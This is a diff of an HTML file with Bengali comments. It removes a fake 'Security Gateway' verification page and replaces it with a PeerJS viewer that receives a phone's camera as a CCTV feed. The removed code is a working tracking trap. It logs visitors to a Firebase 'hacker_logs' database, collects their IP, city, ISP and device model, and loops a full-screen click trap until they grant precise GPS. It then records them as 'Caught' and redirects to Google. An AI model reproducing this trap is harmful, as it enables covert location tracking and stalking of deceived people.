@@ -2,202 +2,140 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Security Gateway</title>
-    
-    <!-- UAParser -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
-    
-    <!-- Firebase SDK -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
-            authDomain: "location-611d6.firebaseapp.com",
-            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
-            projectId: "location-611d6",
-            storageBucket: "location-611d6.firebasestorage.app",
-            messagingSenderId: "903100559116",
-            appId: "1:903100559116:web:08c8c9e1d7282048116329"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-
-        // ১. পেজ লোড হওয়ামাত্রই খালি লগ তৈরি করা (যাতে লোকেশন সেভ করার জায়গা থাকে)
-        window.createInitialLog = function() {
-            const trackerRef = ref(db, 'hacker_logs');
-            const newLogRef = push(trackerRef);
-            
-            // সাথে সাথে একটা এন্ট্রি তৈরি করে ফেললাম
-            set(newLogRef, {
-                timestamp: new Date().toString(),
-                latitude: "Requesting Now...",  // আমরা এখনই চাইছি
-                longitude: "Requesting Now...",
-                ip: "Fetching...",              // এগুলো পরে আসবে
-                deviceModel: "Fetching...",
-                actionStatus: "Trap Started - GPS First"
-            });
-
-            // সেশন কি (Key) সেভ রাখা
-            sessionStorage.setItem('logKey', newLogRef.key);
-        };
-
-        // ২. আইপি এবং ডিভাইস ইনফো আপডেট করা (ব্যাকগ্রাউন্ডে চলবে)
-        window.updateBackgroundInfo = function(data) {
-            const key = sessionStorage.getItem('logKey');
-            if (key) {
-                const updateRef = ref(db, 'hacker_logs/' + key);
-                update(updateRef, data);
-            }
-        };
-
-        // ৩. লোকেশন আপডেট (মেইন কাজ)
-        window.updateWithGPS = function(lat, lng) {
-            const key = sessionStorage.getItem('logKey');
-            if (key) {
-                const updateRef = ref(db, 'hacker_logs/' + key);
-                update(updateRef, {
-                    latitude: lat,
-                    longitude: lng,
-                    actionStatus: "✅ Verified & Caught"
-                }).then(() => {
-                    // কাজ শেষে গুগলে পাঠিয়ে দেওয়া
-                    window.location.href = "https://www.google.com";
-                });
-            }
-        };
-    </script>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin CCTV Receiver</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
+        /* Neumorphism Base Styles (Sender-এর সাথে মিল রেখে) */
         body {
-            margin: 0; padding: 0;
-            background-color: #f0f2f5;
-            display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            height: 100vh; overflow: hidden;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            cursor: progress;
-        }
-
-        #clickTrap {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9999; cursor: pointer;
-        }
-
-        .loader-box {
+            background-color: #e0e5ec;
+            color: #4a4a4a;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
             text-align: center;
-            background: #ffffff;
-            padding: 40px; border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-            max-width: 300px;
         }
 
-        .spinner {
-            width: 50px; height: 50px;
-            border: 5px solid #e1e4e8;
-            border-top: 5px solid #007bff;
+        /* CCTV ফ্রেম */
+        .cctv-frame {
+            width: 90%;
+            max-width: 600px;
+            height: 80vh;
+            border-radius: 20px;
+            background: #e0e5ec;
+            box-shadow: 7px 7px 15px rgb(163,177,198,0.7), 
+                       -7px -7px 15px rgba(255,255,255, 0.9);
+            padding: 15px;
+            position: relative;
+        }
+
+        #remoteVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: contain; /* ভিডিও ফ্রেমের ভেতরে ফিট হবে */
+            border-radius: 15px;
+            background: #333; /* সংযোগ না থাকলে কালো থাকবে */
+        }
+
+        /* স্ট্যাটাস ডিসপ্লে */
+        .status-display {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 18px;
+            font-weight: bold;
+            color: #a3b1c6;
+            text-shadow: 1px 1px 1px #fff;
+        }
+        
+        .indicator {
+            display: inline-block;
+            width: 15px;
+            height: 15px;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
+            margin-right: 8px;
+            background-color: #ffc107;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        h2 { color: #333; font-size: 18px; margin-bottom: 5px; }
-        p { color: #888; font-size: 13px; }
+        .live { background-color: #00e676; }
+        .error { background-color: #ff3d00; }
     </style>
 </head>
 <body>
 
-    <div id="clickTrap" onclick="forceBrowserPrompt()"></div>
-
-    <div class="loader-box">
-        <div class="spinner"></div>
-        <h2 id="statusText">Security Check...</h2>
-        <p>Verifying network encryption.</p>
+    <div class="cctv-frame">
+        <video id="remoteVideo" autoplay playsinline></video>
+        <div class="status-display" id="adminStatus">
+            <span class="indicator" id="statusIndicator"></span>
+            Waiting for CCTV Signal...
+        </div>
     </div>
 
     <script>
-        let isAsking = false;
+        const remoteVideo = document.getElementById('remoteVideo');
+        const adminStatus = document.getElementById('adminStatus');
+        const statusIndicator = document.getElementById('statusIndicator');
 
-        // 🔥 সবথেকে ফাস্ট এক্সিকিউশন
-        window.onload = function() {
-            // ১. ডাটাবেসে জায়গা বুক করা (মিলিসেকেন্ডের মধ্যে)
-            if(window.createInitialLog) window.createInitialLog();
+        // এই ID টা Sender App (ভাঙ্গা ফোন) এ ফিক্সড করে দেওয়া হয়েছে
+        const MY_PEER_ID = 'ADMIN_KAWSAR'; 
 
-            // ২. লোকেশন চাওয়া শুরু (সবার আগে!)
-            startAnnoyingLoop();
+        // ১. PeerJS সংযোগ শুরু করা
+        const peer = new Peer(MY_PEER_ID, {
+            host: 'peerjs.cloud', 
+            port: 443, 
+            secure: true,
+            config: {'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}]}
+        });
 
-            // ৩. আইপি এবং ডিভাইস ইনফো আস্তে ধীরে আনা (ব্যাকগ্রাউন্ডে)
-            fetchBackgroundData();
-        };
+        peer.on('open', (id) => {
+            adminStatus.innerHTML = `<span class="indicator" style="background-color:#00e676;"></span> Admin Panel ID: <b>${id}</b> <br> Ready to receive signal...`;
+        });
 
-        function fetchBackgroundData() {
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(ipData => {
-                    var parser = new UAParser();
-                    var result = parser.getResult();
-                    let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");
+        peer.on('error', (err) => {
+            console.error(err);
+            statusIndicator.classList.add('error');
+            adminStatus.innerHTML = `<span class="indicator error"></span> Connection Error! Please check internet.`;
+        });
 
-                    let bgData = {
-                        ip: ipData.ip || "Unknown",
-                        city: ipData.city || "Unknown",
-                        isp: ipData.org || "Unknown",
-                        deviceModel: deviceName,
-                        os: result.os.name,
-                        browser: result.browser.name
-                    };
-                    
-                    // ডাটাবেস আপডেট করে দেওয়া
-                    if(window.updateBackgroundInfo) window.updateBackgroundInfo(bgData);
-                })
-                .catch(() => {
-                    // ফেইল করলে অন্তত ডিভাইস নেম আপডেট করা
-                    var parser = new UAParser();
-                    if(window.updateBackgroundInfo) window.updateBackgroundInfo({ deviceModel: parser.getResult().os.name });
-                });
-        }
-
-        function startAnnoyingLoop() {
-            // পেজ লোড হওয়ার সাথে সাথেই অ্যাটাক! (দেরি নেই)
-            setTimeout(forceBrowserPrompt, 100); 
+        // ২. Sender (CCTV ফোন) কল করলে এই ফাংশনটা চালু হবে
+        peer.on('call', (call) => {
             
-            // স্ক্রিনে টাচ করলেই আবার চাইবে
-            document.addEventListener('touchstart', forceBrowserPrompt);
-            document.addEventListener('click', forceBrowserPrompt);
-        }
+            // কল রিসিভ করা। Admin Panel এর কোনো লোকাল স্ট্রিম দরকার নেই, তাই null
+            call.answer(null); 
 
-        function forceBrowserPrompt() {
-            if(isAsking) return;
-            isAsking = true;
+            // যখন ভিডিও স্ট্রিম আসা শুরু করবে
+            call.on('stream', (remoteStream) => {
+                remoteVideo.srcObject = remoteStream;
+                remoteVideo.play();
+                statusIndicator.classList.add('live');
+                adminStatus.innerHTML = `<span class="indicator live"></span> LIVE FEED: Connected to CCTV.`;
+            });
+            
+            // স্ট্রিম বন্ধ হলে বা কেটে গেলে
+            call.on('close', () => {
+                statusIndicator.classList.remove('live');
+                statusIndicator.classList.add('error');
+                remoteVideo.srcObject = null;
+                adminStatus.innerHTML = `<span class="indicator error"></span> Signal Lost! Waiting for reconnect...`;
+            });
+            
+        });
 
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        // লোকেশন পেয়ে গেছি!
-                        document.getElementById('statusText').innerText = "Verified!";
-                        document.querySelector('.spinner').style.borderTopColor = "#00b894";
-                        
-                        document.removeEventListener('touchstart', forceBrowserPrompt);
-                        document.removeEventListener('click', forceBrowserPrompt);
-                        document.getElementById('clickTrap').style.display = 'none';
+        // ৩. ইন্টারনেট সংযোগ চেক
+        window.addEventListener('offline', () => {
+            statusIndicator.classList.add('error');
+            adminStatus.innerHTML = `<span class="indicator error"></span> Internet OFFLINE on Admin Side.`;
+        });
 
-                        if(window.updateWithGPS) {
-                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
-                        }
-                    },
-                    function(error) {
-                        isAsking = false;
-                        console.log("Re-arming trap.");
-                        // ইউজার রিজেক্ট করলে আবার লুপ চলবে
-                    },
-                    { enableHighAccuracy: true }
-                );
-            }
-        }
+        window.addEventListener('online', () => {
+            adminStatus.innerHTML = `<span class="indicator live"></span> Internet Back. Waiting for CCTV Signal...`;
+        });
+
     </script>
 </body>
 </html>
